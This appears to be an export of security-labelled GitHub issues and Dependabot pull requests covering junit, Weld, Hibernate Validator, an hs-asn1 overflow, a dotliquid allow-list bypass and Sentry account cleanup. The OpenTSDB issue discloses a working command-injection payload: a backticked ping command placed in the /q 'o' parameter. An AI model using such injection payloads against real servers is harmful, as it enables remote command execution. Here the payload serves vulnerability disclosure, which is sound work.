<h3>Security fix: <code>TemporaryFolder</code> now limits access to temporary folders on Java 1.7 or later</h3>
<p>A local information disclosure vulnerability in <code>TemporaryFolder</code> has been fixed. See the published <a href=""https://github.com/junit-team/junit4/security/advisories/GHSA-269g-pwp5-87pp"">security advisory</a> for details.</p>
<h1>Test Runners</h1>
<h3>[Pull request <a href=""https://github-redirect.dependabot.com/junit-team/junit4/issues/1669"">#1669</a>:](<a href=""https://github-redirect.dependabot.com/junit-team/junit/pull/1669"">junit-team/junit#1669</a>) Make <code>FrameworkField</code> constructor public</h3>
<p>Prior to this change, custom runners could make <code>FrameworkMethod</code> instances, but not <code>FrameworkField</code> instances. This small change allows for both now, because <code>FrameworkField</code>'s constructor has been promoted from package-private to public.</p>
</blockquote>
</details>
<details>
<summary>Commits</summary>
<ul>
<li><a href=""https://github.com/junit-team/junit4/commit/1b683f4ec07bcfa40149f086d32240f805487e66""><code>1b683f4</code></a> [maven-release-plugin] prepare release r4.13.1</li>
<li><a href=""https://github.com/junit-team/junit4/commit/ce6ce3aadc070db2902698fe0d3dc6729cd631f2""><code>ce6ce3a</code></a> Draft 4.13.1 release notes</li>
<li><a href=""https://github.com/junit-team/junit4/commit/c29dd8239d6b353e699397eb090a1fd27411fa24""><code>c29dd82</code></a> Change version to 4.13.1-SNAPSHOT</li>
<li><a href=""https://github.com/junit-team/junit4/commit/1d174861f0b64f97ab0722bb324a760bfb02f567""><code>1d17486</code></a> Add a link to assertThrows in exception testing</li>
<li><a href=""https://github.com/junit-team/junit4/commit/543905df72ff10364b94dda27552efebf3dd04e9""><code>543905d</code></a> Use separate line for annotation in Javadoc</li>
<li><a href=""https://github.com/junit-team/junit4/commit/510e906b391e7e46a346e1c852416dc7be934944""><code>510e906</code></a> Add sub headlines to class Javadoc</li>
<li><a href=""https://github.com/junit-team/junit4/commit/610155b8c22138329f0723eec22521627dbc52ae""><code>610155b</code></a> Merge pull request from GHSA-269g-pwp5-87pp</li>
<li><a href=""https://github.com/junit-team/junit4/commit/b6cfd1e3d736cc2106242a8be799615b472c7fec""><code>b6cfd1e</code></a> Explicitly wrap float parameter for consistency (<a href=""https://github-redirect.dependabot.com/junit-team/junit4/issues/1671"">#1671</a>)</li>
<li><a href=""https://github.com/junit-team/junit4/commit/a5d205c7956dbed302b3bb5ecde5ba4299f0b646""><code>a5d205c</code></a> Fix GitHub link in FAQ (<a href=""https://github-redirect.dependabot.com/junit-team/junit4/issues/1672"">#1672</a>)</li>
<li><a href=""https://github.com/junit-team/junit4/commit/3a5c6b4d08f408c8ca6a8e0bae71a9bc5a8f97e8""><code>3a5c6b4</code></a> Deprecated since jdk9 replacing constructor instance of Double and Float (<a href=""https://github-redirect.dependabot.com/junit-team/junit4/issues/1660"">#1660</a>)</li>
<li>Additional commits viewable in <a href=""https://github.com/junit-team/junit4/compare/r4.8.1...r4.13.1"">compare view</a></li>
</ul>
</details>
<br />


[![Dependabot compatibility score](https://api.dependabot.com/badges/compatibility_score?dependency-name=junit:junit&package-manager=maven&previous-version=4.8.1&new-version=4.13.1)](https://dependabot.com/compatibility-score/?dependency-name=junit:junit&package-manager=maven&previous-version=4.8.1&new-version=4.13.1)

Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.

[//]: # (dependabot-automerge-start)
[//]: # (dependabot-automerge-end)

---

<details>
<summary>Dependabot commands and options</summary>
<br />

You can trigger Dependabot actions by commenting on this PR:
- `@dependabot rebase` will rebase this PR
- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it
- `@dependabot merge` will merge this PR after your CI passes on it
- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it
- `@dependabot cancel merge` will cancel a previously requested merge and block automerging
- `@dependabot reopen` will reopen this PR if it is closed
- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually
- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)
- `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language
- `@dependabot use these reviewers` will set the current reviewers as the default for future PRs for this repo and language
- `@dependabot use these assignees` will set the current assignees as the default for future PRs for this repo and language
- `@dependabot use this milestone` will set the current milestone as the default for future PRs for this repo and language
- `@dependabot badge me` will comment on this PR with code to add a ""Dependabot enabled"" badge to your readme

Additionally, you can set the following in your Dependabot [dashboard](https://app.dependabot.com):
- Update frequency (including time of day and day of week)
- Pull request limits (per update run and/or open at any time)
- Automerge options (never/patch/minor, and dev/runtime dependencies)
- Out-of-range updates (receive only lockfile updates, if desired)
- Security updates (receive only security updates, if desired)



</details>",,yes,"dependencies,security,"
arquillian/arquillian-examples,719549797,"[Security] Bump junit from 4.8.1 to 4.13.1","Bumps [junit](https://github.com/junit-team/junit4) from 4.8.1 to 4.13.1. **This update includes a security fix.**
<details>
<summary>Vulnerabilities fixed</summary>
<p><em>Sourced from <a href=""https://github.com/advisories/GHSA-269g-pwp5-87pp"">The GitHub Security Advisory Database</a>.</em></p>
<blockquote>
<p><strong>TemporaryFolder on unix-like systems does not limit access to created files</strong></p>
<h3>Vulnerability</h3>
<p>The JUnit4 test rule <a href=""https://junit.org/junit4/javadoc/4.13/org/junit/rules/TemporaryFolder.html"">TemporaryFolder</a> contains a local information disclosure vulnerability.</p>
<p>Example of vulnerable code:</p>
<pre lang=""java""><code>public static class HasTempFolder {
    @Rule
    public TemporaryFolder folder = new TemporaryFolder();
<pre><code>@Test
public void testUsingTempFolder() throws IOException {
    folder.getRoot(); // Previous file permissions: `drwxr-xr-x`; After fix:`drwx------`
    File createdFile= folder.newFile(&amp;quot;myfile.txt&amp;quot;); // unchanged/irrelevant file permissions
    File createdFolder= folder.newFolder(&amp;quot;subfolder&amp;quot;); // unchanged/irrelevant file permissions
    // ...
}
</code></pre>
<p>}
</code></pre></p>
<!-- raw HTML omitted -->
<p>Affected versions: &lt; 4.13.1</p>
</blockquote>
</details>
<details>
<summary>Release notes</summary>
<p><em>Sourced from <a href=""https://github.com/junit-team/junit4/releases"">junit's releases</a>.</em></p>
<blockquote>
<h2>JUnit 4.13.1</h2>
<p>Please refer to the <a href=""https://github.com/junit-team/junit/blob/HEAD/doc/ReleaseNotes4.13.1.md"">release notes</a> for details.</p>
<h2>JUnit 4.13</h2>
<p>Please refer to the <a href=""https://github.com/junit-team/junit/blob/HEAD/doc/ReleaseNotes4.13.md"">release notes</a> for details.</p>
<h2>JUnit 4.13 RC 2</h2>
<p>Please refer to the <a href=""https://github.com/junit-team/junit4/wiki/4.13-Release-Notes"">release notes</a> for details.</p>
<h2>JUnit 4.13 RC 1</h2>
<p>Please refer to the <a href=""https://github.com/junit-team/junit4/wiki/4.13-Release-Notes"">release notes</a> for details.</p>
<h2>JUnit 4.13 Beta 3</h2>
<p>Please refer to the <a href=""https://github.com/junit-team/junit4/wiki/4.13-Release-Notes"">release notes</a> for details.</p>
<h2>JUnit 4.13 Beta 2</h2>
<p>Please refer to the <a href=""https://github.com/junit-team/junit4/wiki/4.13-Release-Notes"">release notes</a> for details.</p>
<h2>JUnit 4.13 Beta 1</h2>
<p>Please refer to the <a href=""https://github.com/junit-team/junit4/wiki/4.13-Release-Notes"">release notes</a> for details.</p>
<h2>JUnit 4.12</h2>
<p>Please refer to the <a href=""https://github.com/junit-team/junit/blob/HEAD/doc/ReleaseNotes4.12.md"">release notes</a> for details.</p>
<h2>JUnit 4.12 Beta 3</h2>
<p>Please refer to the <a href=""https://github.com/junit-team/junit/blob/HEAD/doc/ReleaseNotes4.12.md"">release notes</a> for details.</p>
<h2>JUnit 4.12 Beta 2</h2>
<p>No release notes provided.</p>
<h2>JUnit 4.12 Beta 1</h2>
<p>No release notes provided.</p>
<h2>JUnit 4.11</h2>
<p>No release notes provided.</p>
</blockquote>
</details>
<details>
<summary>Changelog</summary>
<p><em>Sourced from <a href=""https://github.com/junit-team/junit4/blob/main/doc/ReleaseNotes4.13.1.md"">junit's changelog</a>.</em></p>
<blockquote>
<h2>Summary of changes in version 4.13.1</h2>
<h1>Rules</h1>
<h3>Security fix: <code>TemporaryFolder</code> now limits access to temporary folders on Java 1.7 or later</h3>
<p>A local information disclosure vulnerability in <code>TemporaryFolder</code> has been fixed. See the published <a href=""https://github.com/junit-team/junit4/security/advisories/GHSA-269g-pwp5-87pp"">security advisory</a> for details.</p>
<h1>Test Runners</h1>
<h3>[Pull request <a href=""https://github-redirect.dependabot.com/junit-team/junit4/issues/1669"">#1669</a>:](<a href=""https://github-redirect.dependabot.com/junit-team/junit/pull/1669"">junit-team/junit#1669</a>) Make <code>FrameworkField</code> constructor public</h3>
<p>Prior to this change, custom runners could make <code>FrameworkMethod</code> instances, but not <code>FrameworkField</code> instances. This small change allows for both now, because <code>FrameworkField</code>'s constructor has been promoted from package-private to public.</p>
</blockquote>
</details>
<details>
<summary>Commits</summary>
<ul>
<li><a href=""https://github.com/junit-team/junit4/commit/1b683f4ec07bcfa40149f086d32240f805487e66""><code>1b683f4</code></a> [maven-release-plugin] prepare release r4.13.1</li>
<li><a href=""https://github.com/junit-team/junit4/commit/ce6ce3aadc070db2902698fe0d3dc6729cd631f2""><code>ce6ce3a</code></a> Draft 4.13.1 release notes</li>
<li><a href=""https://github.com/junit-team/junit4/commit/c29dd8239d6b353e699397eb090a1fd27411fa24""><code>c29dd82</code></a> Change version to 4.13.1-SNAPSHOT</li>
<li><a href=""https://github.com/junit-team/junit4/commit/1d174861f0b64f97ab0722bb324a760bfb02f567""><code>1d17486</code></a> Add a link to assertThrows in exception testing</li>
<li><a href=""https://github.com/junit-team/junit4/commit/543905df72ff10364b94dda27552efebf3dd04e9""><code>543905d</code></a> Use separate line for annotation in Javadoc</li>
<li><a href=""https://github.com/junit-team/junit4/commit/510e906b391e7e46a346e1c852416dc7be934944""><code>510e906</code></a> Add sub headlines to class Javadoc</li>
<li><a href=""https://github.com/junit-team/junit4/commit/610155b8c22138329f0723eec22521627dbc52ae""><code>610155b</code></a> Merge pull request from GHSA-269g-pwp5-87pp</li>
<li><a href=""https://github.com/junit-team/junit4/commit/b6cfd1e3d736cc2106242a8be799615b472c7fec""><code>b6cfd1e</code></a> Explicitly wrap float parameter for consistency (<a href=""https://github-redirect.dependabot.com/junit-team/junit4/issues/1671"">#1671</a>)</li>
<li><a href=""https://github.com/junit-team/junit4/commit/a5d205c7956dbed302b3bb5ecde5ba4299f0b646""><code>a5d205c</code></a> Fix GitHub link in FAQ (<a href=""https://github-redirect.dependabot.com/junit-team/junit4/issues/1672"">#1672</a>)</li>
<li><a href=""https://github.com/junit-team/junit4/commit/3a5c6b4d08f408c8ca6a8e0bae71a9bc5a8f97e8""><code>3a5c6b4</code></a> Deprecated since jdk9 replacing constructor instance of Double and Float (<a href=""https://github-redirect.dependabot.com/junit-team/junit4/issues/1660"">#1660</a>)</li>
<li>Additional commits viewable in <a href=""https://github.com/junit-team/junit4/compare/r4.8.1...r4.13.1"">compare view</a></li>
</ul>
</details>
<br />


[![Dependabot compatibility score](https://api.dependabot.com/badges/compatibility_score?dependency-name=junit:junit&package-manager=maven&previous-version=4.8.1&new-version=4.13.1)](https://dependabot.com/compatibility-score/?dependency-name=junit:junit&package-manager=maven&previous-version=4.8.1&new-version=4.13.1)

Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.

[//]: # (dependabot-automerge-start)
[//]: # (dependabot-automerge-end)

---

<details>
<summary>Dependabot commands and options</summary>
<br />

You can trigger Dependabot actions by commenting on this PR:
- `@dependabot rebase` will rebase this PR
- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it
- `@dependabot merge` will merge this PR after your CI passes on it
- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it
- `@dependabot cancel merge` will cancel a previously requested merge and block automerging
- `@dependabot reopen` will reopen this PR if it is closed
- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually
- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)
- `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language
- `@dependabot use these reviewers` will set the current reviewers as the default for future PRs for this repo and language
- `@dependabot use these assignees` will set the current assignees as the default for future PRs for this repo and language
- `@dependabot use this milestone` will set the current milestone as the default for future PRs for this repo and language
- `@dependabot badge me` will comment on this PR with code to add a ""Dependabot enabled"" badge to your readme

Additionally, you can set the following in your Dependabot [dashboard](https://app.dependabot.com):
- Update frequency (including time of day and day of week)
- Pull request limits (per update run and/or open at any time)
- Automerge options (never/patch/minor, and dev/runtime dependencies)
- Out-of-range updates (receive only lockfile updates, if desired)
- Security updates (receive only security updates, if desired)



</details>",,yes,"dependencies,security,"
arquillian/arquillian-examples,382291037,"[Security] Bump weld-core from 1.1.9.Final to 2.4.8.Final","Bumps weld-core from 1.1.9.Final to 2.4.8.Final. **This update includes security fixes.**
<details>
<summary>Vulnerabilities fixed</summary>

*Sourced from [The Sonatype OSS Index](https://ossindex.sonatype.org/vuln/17a3a876-a605-47b2-a08d-c73e1791484c).*

> **[CVE-2014-8122]  Concurrent Execution using Shared Resource with Improper Synchronization (""Race Condition"")**
> Race condition in JBoss Weld before 2.2.8 and 3.x before 3.0.0 Alpha3 allows remote attackers to obtain information from a previous conversation via vectors related to a stale thread state.
> 
> Affected versions: (, 2.2.7]; [3.0.0-alpha1, 3.0.0-alpha2]

</details>
<br />

[![Dependabot compatibility score](https://api.dependabot.com/badges/compatibility_score?dependency-name=org.jboss.weld:weld-core&package-manager=maven&previous-version=1.1.9.Final&new-version=2.4.8.Final)](https://dependabot.com/compatibility-score.html?dependency-name=org.jboss.weld:weld-core&package-manager=maven&previous-version=1.1.9.Final&new-version=2.4.8.Final)

Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.

---

**Note:** This repo was added to Dependabot recently, so you'll receive a maximum of 5 PRs for your first few update runs. Once an update run creates fewer than 5 PRs we'll remove that limit.

You can always request more updates by clicking `Bump now` in your [Dependabot dashboard](https://app.dependabot.com).

<details>
<summary>Dependabot commands and options</summary>
<br />

You can trigger Dependabot actions by commenting on this PR:
- `@dependabot rebase` will rebase this PR
- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it
- `@dependabot merge` will merge this PR after your CI passes on it
- `@dependabot cancel merge` will cancel a previously requested merge
- `@dependabot reopen` will reopen this PR if it is closed
- `@dependabot ignore this [patch|minor|major] version` will close this PR and stop Dependabot creating any more for this minor/major version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)
- `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language
- `@dependabot use these reviewers` will set the current reviewers as the default for future PRs for this repo and language
- `@dependabot use these assignees` will set the current assignees as the default for future PRs for this repo and language
- `@dependabot use this milestone` will set the current milestone as the default for future PRs for this repo and language
- `@dependabot badge me` will comment on this PR with code to add a ""Dependabot enabled"" badge to your readme

Additionally, you can set the following in your Dependabot [dashboard](https://app.dependabot.com):
- Update frequency (including time of day and day of week)
- Automerge options (never/patch/minor, and dev/runtime dependencies)
- Pull request limits (per update run and/or open at any time)
- Out-of-range updates (receive only lockfile updates, if desired)
- Security updates (receive only security updates, if desired)

Finally, you can contact us by mentioning @dependabot.

</details>",,yes,"dependencies,security,"
arquillian/arquillian-examples,866010705,"[Security] Bump hibernate-validator from 4.0.0.GA to 5.0.0.Final","Bumps [hibernate-validator](https://github.com/hibernate/hibernate-validator) from 4.0.0.GA to 5.0.0.Final. **This update includes a security fix.**
<details>
<summary>Vulnerabilities fixed</summary>
<p><em>Sourced from <a href=""https://github.com/advisories/GHSA-xxgp-pcfc-3vgc"">The GitHub Security Advisory Database</a>.</em></p>
<blockquote>
<p><strong>Privilege Escalation in Hibernate Validator</strong>
In Hibernate Validator 5.2.x before 5.2.5 final, 5.3.x, and 5.4.x, it was found that when the security manager's reflective permissions, which allows it to access the private members of the class, are granted to Hibernate Validator, a potential privilege escalation can occur. By allowing the calling code to access those private members without the permission an attacker may be able to validate an invalid instance and access the private member value via ConstraintViolation#getInvalidValue().</p>
<p>Affected versions: &lt; 4.3.4</p>
</blockquote>
</details>
<details>
<summary>Changelog</summary>
<p><em>Sourced from <a href=""https://github.com/hibernate/hibernate-validator/blob/main/changelog.txt"">hibernate-validator's changelog</a>.</em></p>
<blockquote>
<h2>5.0.0.Final (11.04.2013)</h2>
<p>** Bug
* [HV-787] - javax.enterprise.inject.spi.Bean implementations should also implement PassivationCapable
* [HV-788] - Upgrade BV API and TCK to final versions</p>
<p>** Improvement
* [HV-752] - Check transitive dependencies from CDI API
* [HV-785] - Improve structure of JavaDoc</p>
<p>** Task
* [HV-781] - Align with latest Weld release</p>
<h2>5.0.0.CR5 (02.04.2013)</h2>
<p>** Bug
* [HV-778] - Provide a way to deactivate cdi extension
* [HV-782] - Multiple constraint-mappings files for one constraint to not work</p>
<p>** Improvement
* [HV-648] - Script documentation and distribution upload
* [HV-724] - Remove JavaDoc warnings
* [HV-783] - Extract hierarchy related functionality from ReflectionHelper
* [HV-786] - Update dependencies to Weld and BV TCK</p>
<h2>5.0.0.CR4 (20.03.2013)</h2>
<p>** Bug
* [HV-678] - Constraint is validated several times if part of several groups
* [HV-766] - Method return values are allowed to be marked with <a href=""https://github.com/Valid""><code>@​Valid</code></a> in parallel methods
* [HV-767] - Group conversions not correctly applied for inherited group
* [HV-771] - <a href=""https://github.com/ValidateOnExecution""><code>@​ValidateOnExecution</code></a> not retrieved from overridden methods for sub-classes
* [HV-772] - <a href=""https://github.com/ValidateOnExecution""><code>@​ValidateOnExecution</code></a> not always retrieved from highest method in inheritance hierarchy
* [HV-773] - <a href=""https://github.com/ValidateOnExecution""><code>@​ValidateOnExecution</code></a>(type=IMPLICIT) on type-level causes getters to be validated
* [HV-774] - Consider return type when detecting getter methods
* [HV-775] - Node#as() doesn't throw ClassCastException if wrong type is passed
* [HV-776] - ValidationExtension should throw an exception in case of invalid <a href=""https://github.com/ValidateOnExecution""><code>@​ValidateOnExecution</code></a> configuration</p>
<p>** Improvement
* [HV-672] - Throw meaningful exception in case object and method passed to validateParameters() don't match
* [HV-768] - Eagerly throw exceptions in case of illegal method constraints
* [HV-770] - Cascaded return value validation causes exception when used with Weld
* [HV-777] - Adapt to changed option name for excluding integration tests from TCK run</p>
<!-- raw HTML omitted -->
</blockquote>
<p>... (truncated)</p>
</details>
<details>
<summary>Commits</summary>
<ul>
<li><a href=""https://github.com/hibernate/hibernate-validator/commit/6464faa54e83bd9ed4ff1096e927bd67de20e4ad""><code>6464faa</code></a> [maven-release-plugin] prepare release 5.0.0.Final</li>
<li><a href=""https://github.com/hibernate/hibernate-validator/commit/502e5a675938fbb5a0da2daac5a6829783c8a3df""><code>502e5a6</code></a> Updating readme and changelog for 5.0.0.Final release</li>
<li><a href=""https://github.com/hibernate/hibernate-validator/commit/456e2b1367e84e79c9d84f103fa1f9053a130ff0""><code>456e2b1</code></a> HV-725 Chapter 1 updates - describing EL and CDI PE dependencies, making logg...</li>
<li><a href=""https://github.com/hibernate/hibernate-validator/commit/58f6044b797ede90d0f449ea7a8e333db475eba2""><code>58f6044</code></a> HV-785 Grouping portable extension package separately and adding additional e...</li>
<li><a href=""https://github.com/hibernate/hibernate-validator/commit/25c44c14898310c38a034d680bff5d6635e342e3""><code>25c44c1</code></a> HV-752 Removing explicit excludes from cdi-api dependency. jboss-interceptors...</li>
<li><a href=""https://github.com/hibernate/hibernate-validator/commit/a0ac9a7c215ba7f5b4993cc674769931c48942b3""><code>a0ac9a7</code></a> HV-788 Upgrading to BV API and TCK final</li>
<li><a href=""https://github.com/hibernate/hibernate-validator/commit/5ec0cf276f78b3c50e8f0608beb05cb13f44d24d""><code>5ec0cf2</code></a> HV-781 Updating to Weld Core CR2</li>
<li><a href=""https://github.com/hibernate/hibernate-validator/commit/d550ed24998bde27791d3d614322b4fec1244f0d""><code>d550ed2</code></a> HV-787 Replacing deprecated assertion methods</li>
<li><a href=""https://github.com/hibernate/hibernate-validator/commit/a1df6a68884b045e8024a2e8a8a7ff7eb55b1bed""><code>a1df6a6</code></a> HV-787 Implementing PassivationCapable for ValidatorBean and ValidatorFactory...</li>
<li><a href=""https://github.com/hibernate/hibernate-validator/commit/5b91095f2992ea035f5a78a5a59bb4dfc3055e66""><code>5b91095</code></a> [maven-release-plugin] prepare for next development iteration</li>
<li>Additional commits viewable in <a href=""https://github.com/hibernate/hibernate-validator/compare/4.0.0.GA...5.0.0.Final"">compare view</a></li>
</ul>
</details>
<br />


[![Dependabot compatibility score](https://api.dependabot.com/badges/compatibility_score?dependency-name=org.hibernate:hibernate-validator&package-manager=maven&previous-version=4.0.0.GA&new-version=5.0.0.Final)](https://dependabot.com/compatibility-score/?dependency-name=org.hibernate:hibernate-validator&package-manager=maven&previous-version=4.0.0.GA&new-version=5.0.0.Final)

Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.

[//]: # (dependabot-automerge-start)
[//]: # (dependabot-automerge-end)

---

<details>
<summary>Dependabot commands and options</summary>
<br />

You can trigger Dependabot actions by commenting on this PR:
- `@dependabot rebase` will rebase this PR
- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it
- `@dependabot merge` will merge this PR after your CI passes on it
- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it
- `@dependabot cancel merge` will cancel a previously requested merge and block automerging
- `@dependabot reopen` will reopen this PR if it is closed
- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually
- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)
- `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language
- `@dependabot use these reviewers` will set the current reviewers as the default for future PRs for this repo and language
- `@dependabot use these assignees` will set the current assignees as the default for future PRs for this repo and language
- `@dependabot use this milestone` will set the current milestone as the default for future PRs for this repo and language
- `@dependabot badge me` will comment on this PR with code to add a ""Dependabot enabled"" badge to your readme

Additionally, you can set the following in your Dependabot [dashboard](https://app.dependabot.com):
- Update frequency (including time of day and day of week)
- Pull request limits (per update run and/or open at any time)
- Automerge options (never/patch/minor, and dev/runtime dependencies)
- Out-of-range updates (receive only lockfile updates, if desired)
- Security updates (receive only security updates, if desired)



</details>",,yes,"dependencies,security,"
vincenthz/hs-asn1,158842174,"Fix + Test for #17","I think the change you just made fixes the problem, but this is still an improvement. Specifically checking for lengths long enough to overflow makes the constraint clearer and gives a better error message. And tests are always good :)

As to your question of why `ensure` doesn't actually ensure the input is long enough: it's because the overflow makes the argument negative in this case. `B.length s0 >= n` is always true when `n` is negative, so it always acts as if there is enough input.
","I think your code can be slightly simplified to:

``` haskell
let intByteSize = finiteBitSize (undefined :: Int) `quot` 8
lw <- getBytes len
if B.length lw > intByteSize - 1
    then fail ""invalid length - would overflow""
    else return (LenLong len $ uintbs lw)
```

(Or maybe using bitSize instead of finiteBitSize if we need better backwards-compatibility)

But both of our approaches seem to be slightly too pessimistic, i.e. on a 32-bit machine we reject inputs longer than 3 bytes, even though 4 bytes may work if the number is positive. I don't really know anything about ASN.1 so I can't say if this might be a problem in practice.
@enolan: I agree that further hardening of the code and definitely adding tests is the right thing to do here

I think the right thing to do here is moving to `Integer` instead of `Int` so that we don't overflow, and put a reasonable limit on the number of bytes that can be pulled for safety reason.
further data point, the same bug has been present in `cereal` until 0.3.5.2
Do you mean making the second field of `LenLong` an `Integer` instead of an `Int`? There's no way to write a `getBytes :: Integer -> ByteString` - an array longer than the machine word size is impossible.

Alternative: accumulate an `Integer` in `uintbs` and check if it's bigger than `maxBound :: Int` before converting it to `Int` and putting it in `LenLong`. If it's too big, throw an error. This solves the problem @hreinhardt pointed out - the largest possible length is 2^31-1 bytes or 2^63-1 bytes (~2 GiB or 8 EiB) instead of 2^24-1 bytes or 2^58-1 bytes (~16 MiB or 256 PiB).

If that sounds good I can go make the change.
This might also be a possible solution:

``` haskell
let intByteSize = finiteBitSize (undefined :: Int) `quot` 8
lw <- getBytes len
if (B.length lw < intByteSize) ||
   (B.length lw == intByteSize && B.head lw < 128)
    then return (LenLong len $ uintbs lw)
    else fail ""invalid length - would overflow""
```

It would allow 32/64-bit lengths if they represent positive numbers.
What's the status of this? Id really like to be able to close out my original problem. 
I don't think we made progress related to fixing the underlaying issue
",yes,"bug,security,"
juliend2/Lennon,308097,"show the password with ***** instead of plain text in admin","in the Option admin section, show admin_password with ****\* instead of plain text. And have a password field instead of text field when we edit the field
",,no,"security,"
dotliquid/dotliquid,266738186,"map and sort filters violate safe-type allowed members (Drops concept breach)","### Dotliquid version
2.0.183

### Expected behavior
**map** and **sort** filters should obey safe-type allowed members collections.

### Actual behavior
**map** and **sort** filters access directly object members through reflection ignoring allowed members collection of the accessed type

### Steps to reproduce the Problem (you can add files)



	public class Employee
	{
		public string Name { get; set; }
		public decimal Salary { get; set; }
	}

	var template = DotLiquid.Template.Parse(""{{employees | sort:'Salary' | map:'Name' | join:', '}} | {{employees | map:'Salary' | join:', '}}"");
	DotLiquid.Template.RegisterSafeType(typeof(Employee), new[] { nameof(Employee.Name) });
	var result = template.Render(DotLiquid.Hash.FromDictionary(new Dictionary<string, object> {
		{ ""employees"", new [] { new Employee { Name = ""A"", Salary = 456 }, new Employee { Name = ""B"", Salary = 123 } } }
	}));

This results in:
`B, A | 456, 123`

But using the `Salary` property is prohibited as it's not declared as allowed member via RegisterSafeType method, so an empty string or null should be returned instead of its true value.

This is heavy security issue and it violates the Drops concept.","I propose this solution, which solves not only the security breach, but also naming conventions of property used as a map filter's parameter (#272) and makes map filter resilient to null input and null array items (#269)

	public static IEnumerable Map(IEnumerable input, string property)
	{
		if (input == null)
			return null;

		List<object> ary = input.Cast<object>().ToList();
		if (!ary.Any())
			return ary;

		if ((ary.All(o => o is IDictionary)) && ((IDictionary)ary.First()).Contains(property))
			return ary.Select(e => ((IDictionary)e)[property]);

		return ary.Select(e => {
			if (e == null)
				return null;

			var drop = e as DropBase;
			if (drop == null)
			{
				var type = e.GetType();
				var safeTypeTransformer = Template.GetSafeTypeTransformer(type);
				if (safeTypeTransformer != null)
					drop = safeTypeTransformer(e) as DropBase;
				else
				{
					var attr = type.GetTypeInfo().GetCustomAttributes(typeof(LiquidTypeAttribute), 	false).FirstOrDefault() as LiquidTypeAttribute;
					if (attr != null)
						drop = new DropProxy(e, attr.AllowedMembers);
				}
			}
			return drop?.InvokeDrop(property);
		});
	}
",no,"confirmed bug,security-issue,"
OpenTSDB/opentsdb,336845448,"Many parameters to the /q URL can execute command, including o, key, style, yrange and its json input, y2range and its json input.","url: opentsdb-a.b.com:4242/q?start=x&end=x&m=x&o=&yrange=[0:]&y2range=[0:]&key=x&style=x&wxh=x&json
payload: take 'o' parameter as example
requeset url: opentsdb-a.b.com:4242/q?start=x&end=x&m=x&o=%60ping%20-c%2010%20127.0.0.1%60&yrange=[0:]&y2range=[0:]&key=x&style=x&wxh=x&json
response: show ping infomation.
ps: opentsdb-a.b.com is a host which use opentsdb service.

impact:
1. I have checked the version below 2.3.0, including 2.3.0, 2.2.0, 2.1.4, all are vulnerable. The other versions below 2.3.0 haven't check may probably has the same problem.
2. The latest version of opentsdb(2.3.1) has fixed the vulnerability. 

It's very important for users to know this vulnerability, and update the latest version as soon as possible. Don't let your server device in great danger!
",,no,"security,"
getsentry/sentry,839081383,"Sunset inactive accounts","## Summary

Sometimes users sign up, and they start using Sentry right away. A year later they are happy customers. Other times, it takes a few months for them to get going. And then sometimes a user signs up, and drifts away, never to return. It can be a signal that we're in charge of our situation if we deactivate or delete these accounts after a year or two.

## Motivation

Not sure how much this matters in terms of resource consumption or security surface, and how much is simply hygiene and projection of with-it-ness.

## Additional Context

I'm ticketing this from [a Twitter thread](https://twitter.com/romantomjak/status/1374360818154938371) where a user with a six-year-old inactive account is wondering why we never cleaned up.","Ping @getsentry/enterprise @bowencai8 @jusigler ... fielded this idea from a[n inactive] user via Twitter. Thoughts? Something we have or want to consider?Six years of inactivity is certainly a long time, but I don't see a compelling reason to close inactive accounts as they could restart usage at any point.Deactivating accounts would require us to build a login path to let them reactivate accounts if they come back, so I'm not too keen on doing that. Deleting accounts would not be good as there are apps in maintenance mode that the devs infrequently check on.

I'm trying to understand if the general complaint is due to Sentry sending them a weekly email about their usage even though they are inactive, or if it's about data privacy. Hey 👋  I'm the customer from the Twitter thread. I signed up for Sentry many, many years ago and I can't quite remember why it didn't work out at the time, but this week I was again in the market for an error tracking product and I stumbled upon Sentry. I was very surprised when I already had an account even though I did not remember signing up. I searched my email and turns out I did sign up ~6 years ago! 🧙‍♂️ 

My account was completely abandoned - I did not use API keys, no logins, no errors tracked, nothing. I would be very happy if I'd receive an email that my account was marked for deletion after about a year of no activity whatsoever.

